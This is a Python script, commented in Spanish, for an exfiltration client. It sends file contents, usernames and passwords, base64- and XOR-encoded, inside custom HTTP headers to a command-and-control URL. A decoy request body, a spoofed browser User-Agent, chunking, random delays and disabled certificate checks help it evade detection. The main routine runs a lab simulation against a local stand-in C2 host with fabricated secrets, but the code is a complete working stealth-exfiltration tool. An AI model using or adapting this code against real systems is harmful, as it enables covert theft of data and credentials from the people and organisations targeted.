#!/usr/bin/env python3
"""
Cliente de Exfiltración - Envía datos sensibles vía HTTP/2 headers
"""
import base64
import json
import time
import random
import requests
from urllib3.exceptions import InsecureRequestWarning
import os

# Desactivar warnings SSL
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class ExfilClient:
    def __init__(self, c2_url):
        self.c2_url = c2_url
        self.session = requests.Session()
        
    def encode_data(self, data):
        """Codificar datos en base64"""
        return base64.b64encode(data.encode('utf-8')).decode('utf-8')
    
    def chunk_data(self, data, chunk_size=100):
        """Dividir datos en chunks para evasión"""
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    def exfiltrate_file(self, filepath):
        """Exfiltrar archivo completo"""
        print(f"\n[*] Exfiltrando archivo: {filepath}")
        
        try:
            with open(filepath, 'r') as f:
                content = f.read()
            
            # Dividir en chunks
            chunks = self.chunk_data(content, chunk_size=200)
            total_chunks = len(chunks)
            
            print(f"[*] Total chunks: {total_chunks}")
            
            for i, chunk in enumerate(chunks):
                encoded_chunk = self.encode_data(chunk)
                
                # Headers personalizados (aquí se ocultan los datos)
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                    'X-Session-ID': self.encode_data(f"session_{random.randint(1000,9999)}"),
                    'X-File-Part': encoded_chunk,
                    'X-Chunk-Index': str(i),
                    'X-Total-Chunks': str(total_chunks),
                    'X-Filename': self.encode_data(os.path.basename(filepath)),
                    'X-Custom-Meta': self.encode_data(f"chunk_{i}_of_{total_chunks}"),
                    'Content-Type': 'application/json'
                }
                
                # Payload legítimo (señuelo)
                payload = {
                    'action': 'update',
                    'timestamp': time.time(),
                    'random_data': random.randint(1, 1000)
                }
                
                try:
                    response = self.session.post(
                        self.c2_url,
                        json=payload,
                        headers=headers,
                        verify=False,
                        timeout=5
                    )
                    
                    if response.status_code == 200:
                        print(f"[✓] Chunk {i+1}/{total_chunks} enviado")
                    else:
                        print(f"[!] Error en chunk {i+1}: {response.status_code}")
                    
                    # Delay aleatorio para evasión
                    time.sleep(random.uniform(0.5, 2.0))
                    
                except Exception as e:
                    print(f"[!] Error enviando chunk {i+1}: {e}")
            
            print(f"[✓] Exfiltración completada: {filepath}\n")
            
        except Exception as e:
            print(f"[!] Error leyendo archivo: {e}")
    
    def exfiltrate_credentials(self, username, password, system_info):
        """Exfiltrar credenciales y info del sistema"""
        print("\n[*] Exfiltrando credenciales...")
        
        creds_data = {
            'username': username,
            'password': password,
            'system': system_info
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'X-Credentials': self.encode_data(json.dumps(creds_data)),
            'X-System-Info': self.encode_data(system_info),
            'X-User-Token': self.encode_data(f"{username}:{password}"),
            'Content-Type': 'application/json'
        }
        
        payload = {'action': 'heartbeat', 'status': 'active'}
        
        try:
            response = self.session.post(
                self.c2_url,
                json=payload,
                headers=headers,
                verify=False
            )
            
            if response.status_code == 200:
                print("[✓] Credenciales exfiltradas\n")
        except Exception as e:
            print(f"[!] Error: {e}")
    
    def exfiltrate_encrypted(self, data, key="secret123"):
        """Exfiltrar datos con ofuscación adicional"""
        print("\n[*] Exfiltrando datos ofuscados...")
        
        # Ofuscación simple (XOR)
        obfuscated = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
        encoded = self.encode_data(obfuscated)
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'X-Encrypted-Payload': encoded,
            'X-Encryption-Method': self.encode_data('xor'),
            'Content-Type': 'application/json'
        }
        
        payload = {'action': 'sync', 'timestamp': time.time()}
        
        try:
            response = self.session.post(
                self.c2_url,
                json=payload,
                headers=headers,
                verify=False
            )
            
            if response.status_code == 200:
                print("[✓] Datos ofuscados exfiltrados\n")
        except Exception as e:
            print(f"[!] Error: {e}")

def main():
    C2_URL = "https://c2.malicious.local/exfil"
    
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║      EXFILTRATION CLIENT - HTTP/2 STEALTH MODE          ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    # Verificar conectividad antes de empezar
    print("[*] Verificando conectividad con C2...")
    try:
        test_response = requests.get("https://c2.malicious.local/beacon", 
                                     verify=False, timeout=5)
        if test_response.status_code == 200:
            print("[✓] C2 Server accesible\n")
        else:
            print(f"[!] C2 respondió con código: {test_response.status_code}")
            return
    except Exception as e:
        print(f"[!] ERROR: No se puede conectar al C2")
        print(f"[!] Detalles: {e}")
        print("\n[?] Verifica que:")
        print("    1. El servidor C2 (c2_server.py) esté corriendo")
        print("    2. Nginx esté activo: sudo systemctl status nginx")
        print("    3. /etc/hosts tenga: 127.0.0.1 c2.malicious.local")
        return
    
    client = ExfilClient(C2_URL)
    
    # Crear archivo de prueba con datos sensibles
    test_file = "/tmp/sensitive_data.txt"
    with open(test_file, 'w') as f:
        f.write("""
        CONFIDENTIAL DOCUMENT
        ====================
        Employee Database Access:
        Username: admin
        Password: P@ssw0rd123!
        Database: production_db
        Server: 192.168.1.100
        
        Credit Card Numbers:
        4532-1234-5678-9010
        5425-2345-6789-0123
        
        API Keys:
        sk_live_51Hx8Ty2eZvKYlo2C...
        """)
    
    # Simulación de exfiltración
    print("[*] Iniciando exfiltración...\n")
    
    # 1. Exfiltrar archivo
    client.exfiltrate_file(test_file)
    
    # 2. Exfiltrar credenciales
    client.exfiltrate_credentials(
        username="admin",
        password="SuperSecret123",
        system_info="Windows 10 Pro - 192.168.1.50"
    )
    
    # 3. Exfiltrar datos ofuscados
    client.exfiltrate_encrypted(
        "SECRET: The launch codes are 12345"
    )
    
    print("[✓] Todas las exfiltraciones completadas")

if __name__ == '__main__':
    main()
